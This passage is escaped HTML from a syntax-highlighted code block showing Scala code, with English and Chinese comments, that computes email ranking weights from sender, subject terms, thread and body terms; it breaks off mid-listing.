&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061386088506113-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061386088506113-66&quot;&gt;66&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testingRanks&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//mail contains (full content, date, sender, subject, body)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//包含（全部内容、日期、发送人、主题、正文）的邮件&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Determine the weight of the sender&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//确定发送人的权重&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;senderWeight&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mailsGroupedBySender&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getOrElse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Determine the weight of the subject&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//确定主题的权重&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInSubject&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;subject&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;replaceAll&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;[^a-zA-Z ]&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-19&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termWeight&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInSubject&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;termsInSubject&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tdm&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getOrElse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInSubject&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Determine if the email is from a thread,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//and if it is the weight from this thread:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//判断一封邮件是否来自一个会话，如果是，其在该会话的权重:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadGroupWeight&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;threadGroupedWithWeights&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;weight&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;weight&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-34&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getOrElse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-35&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Determine the commonly used terms in the email and the weight belonging to it:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-37&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//确定邮件中的常用词汇及其权重:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-38&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInMailBody&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;body&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-39&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;replaceAll&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;[^a-zA-Z ]&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-40&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-41&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-43&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061386088506113-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061386088506113-45&quot;&gt;
